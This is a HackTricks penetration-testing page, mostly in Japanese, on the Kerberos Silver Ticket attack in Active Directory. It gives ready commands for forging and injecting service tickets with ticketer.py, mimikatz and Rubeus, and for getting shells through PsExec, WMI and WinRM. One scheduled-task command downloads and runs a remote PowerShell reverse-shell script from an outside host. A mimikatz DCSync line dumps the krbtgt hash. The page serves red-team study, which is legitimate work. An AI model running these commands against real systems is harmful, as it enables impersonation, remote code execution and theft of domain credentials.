# Silver Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

**Silver Ticket**攻撃は、Active Directory (AD) 環境におけるサービスチケットの悪用を含みます。この手法は、**サービスアカウントのNTLMハッシュを取得すること**に依存し、コンピュータアカウントなどのチケットを偽造するために使用されます。この偽造されたチケットを使用することで、攻撃者はネットワーク上の特定のサービスにアクセスでき、**任意のユーザーを偽装**し、通常は管理者権限を目指します。チケットを偽造する際にAESキーを使用することが、より安全で検出されにくいことが強調されています。

チケット作成には、オペレーティングシステムに基づいて異なるツールが使用されます。

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windowsについて
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFSサービスは、被害者のファイルシステムにアクセスするための一般的なターゲットとして強調されていますが、HOSTやRPCSSなどの他のサービスもタスクやWMIクエリのために悪用される可能性があります。

## 利用可能なサービス

| サービスタイプ                               | サービスシルバーチケット                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShellリモーティング                   | <p>HOST</p><p>HTTP</p><p>OSによっては:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては、単に要求することができます: WINRM</p> |
| スケジュールされたタスク                   | HOST                                                                       |
| Windowsファイル共有、またpsexec            | CIFS                                                                       |
| LDAP操作、DCSyncを含む                     | LDAP                                                                       |
| Windowsリモートサーバー管理ツール          | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| ゴールデンチケット                         | krbtgt                                                                     |

**Rubeus**を使用すると、次のパラメータを使用して**すべての**チケットを**要求**できます：

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### シルバーチケットのイベントID

* 4624: アカウントログオン
* 4634: アカウントログオフ
* 4672: 管理者ログオン

## サービスタケットの悪用

次の例では、チケットが管理者アカウントを偽装して取得されたと想定します。

### CIFS

このチケットを使用すると、`C$`および`ADMIN$`フォルダーに**SMB**経由でアクセスでき（公開されている場合）、リモートファイルシステムの一部にファイルをコピーすることができます。
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
あなたはまた、**psexec**を使用してホスト内でシェルを取得したり、任意のコマンドを実行したりすることができます：

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

この権限を使用すると、リモートコンピュータでスケジュールされたタスクを生成し、任意のコマンドを実行することができます：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

これらのチケットを使用すると、**被害者システムでWMIを実行できます**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
以下のページで**wmiexec**に関する詳細情報を見つけてください：

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

winrmアクセスを介してコンピュータに**アクセス**し、PowerShellを取得することさえできます：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
以下のページを確認して、**winrmを使用してリモートホストに接続する他の方法**を学んでください：

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
**winrmはリモートコンピュータでアクティブでリスニングしている必要があります**ので、アクセスしてください。
{% endhint %}

### LDAP

この特権を使用すると、**DCSync**を使用してDCデータベースをダンプできます：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSyncについて詳しく学ぶ**には、以下のページを参照してください：

## 参考文献

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**：**Intigritiにサインアップ**してください。これは**ハッカーによって、ハッカーのために作られたプレミアムバグバウンティプラットフォーム**です！今日、[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**の報酬を得始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
